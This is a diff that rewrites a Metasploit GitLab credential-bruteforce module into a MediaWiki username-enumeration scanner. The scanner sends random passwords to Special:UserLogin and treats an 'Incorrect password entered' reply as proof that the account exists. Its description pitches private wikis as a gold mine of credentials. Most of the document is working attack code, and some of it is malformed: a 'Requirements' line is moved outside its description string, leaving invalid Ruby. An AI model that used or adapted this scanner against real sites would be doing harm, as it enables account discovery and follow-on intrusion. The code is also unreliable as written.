@@ -10,7 +10,7 @@ require 'metasploit/framework/login_scanner/http'
 module Metasploit
   module Framework
     module LoginScanner
-      class GitLab < ::Metasploit::Framework::LoginScanner::HTTP
+      class MediaWikiUsername < ::Metasploit::Framework::LoginScanner::HTTP
         def attempt_login(credential)
           result_opts = {
             credential: credential,
@@ -26,40 +26,35 @@ module Metasploit
             cli.connect
 
             req = cli.request_cgi({
-              'uri' => uri + '/users/sign_in'
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php?title=Special:UserLogin',
             })
 
             res = cli.send_recv(req)
 
             cookie = res.get_cookies
 
-            token = $1 if res and res.body =~ /type="hidden" name="authenticity_token" value="(.*?)" \/><div class="devise-errors">/
-            return unless token
+            edit_token = $1 if res.body =~ /id="wpEditToken" type="hidden" value="(.*?)"/
+            login_token = $1 if res.body =~ /name="wpLoginToken" type="hidden" value="(.*?)"/
 
             req = cli.request_cgi({
-              'uri' => uri + '/users/sign_in',
               'method' => 'POST',
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'index.php?title=Special:UserLogin',
               'vars_post' => {
-                'utf8' => "\xe2\x9c\x93",
-                'authenticity_token' => token,
-                'user[login]' => credential.public,
-                'user[password]' => credential.private,
-                'user[remember_me]' => 0
+                'wpName' => credential.public,
+                'wpPassword' => Rex::Text.rand_text_alpha(8),
+                'authAction' => 'login',
+                'wpLoginToken' => login_token,
+                'wpEditToken' => edit_token,
+                'wploginattempt' => 'Log in',
+                'title' => 'Special:UserLogin',
+                'force' => ''
               },
               'cookie' => cookie
             })
 
             res = cli.send_recv(req)
-            if res and res.body =~ /Retry later\n/
-              while res and res.body =~ /Retry later\n/
-                sleep 10
-                res = cli.send_recv(req)
-              end
-            end
 
-            if res and res.body =~ /<title>Sign in \xC2\xB7 GitLab<\/title>/
-              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
-            elsif res and res.code == 302
+            if res.body =~ /Incorrect password entered/
               result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res.body)
             else
               result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
@@ -85,15 +80,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-        'Name'           => 'GitLab Credential Bruteforcer',
+        'Name'           => 'MediaWiki Username Bruteforce',
         'Description'    => %q(
-        This module attempts to bruteforce weak credentials on a GitLab instance.
+        This module attempts to bruteforce valid usernames on a MediaWiki instance.
 
-        GitLab is a popular open-source version control management system, with
-        similar features to GitHub. Access to GitLab may provide useful sensitive
-        information or even credentials. By default, GitLab has rate limiting enabled
-        on the authentication mechanism. This module attempts to detect when rate limiting
-        is occuring, and sleep while no credentials can be guessed. Tested against 9.0.5.
+        MediaWiki is a popular open-source content management system and collaborative
+        wiki used by busineses, non-profits, and hobbyists alike. Internal or private
+        wikis can be a gold mine of sensitive information, high value targets,
+        or network credentials. This is was tested agains 1.28.1.
 
         Categories: Open Source
 
@@ -105,8 +99,8 @@ class MetasploitModule < Msf::Auxiliary
 
         Arch: Multi
 
-        Requirements: Metasploit Framework
       ),
+        Requirements: Metasploit Framework
         'Author'         =>
           [
           ],
@@ -115,25 +109,22 @@ class MetasploitModule < Msf::Auxiliary
           [
           ],
         'DefaultOptions' => {
-            'RPORT'           => 443,
-            'SSL' => true,
+            'RPORT'           => 80,
             'STOP_ON_SUCCESS' => true
         }
     )
+
+    deregister_options('PASS_FILE', 'USERPASS_FILE', 'PASSWORD', 'BLANK_PASSWORDS', 'USER_AS_PASS', 'DB_ALL_PASS', 'DB_ALL_CREDS')
   end
 
   def run_host(ip)
     cred_collection = ::Metasploit::Framework::CredentialCollection.new(
-      blank_passwords: datastore['BLANK_PASSWORDS'],
-      pass_file: datastore['PASS_FILE'],
-      password: datastore['PASSWORD'],
       user_file: datastore['USER_FILE'],
-      userpass_file: datastore['USERPASS_FILE'],
       username: datastore['USERNAME'],
-      user_as_pass: datastore['USER_AS_PASS']
+      blank_passwords: true
     )
 
-    scanner = Metasploit::Framework::LoginScanner::GitLab.new(
+    scanner = Metasploit::Framework::LoginScanner::MediaWikiUsername.new(
       configure_http_login_scanner(
         host: ip,
         port: datastore['RPORT'],
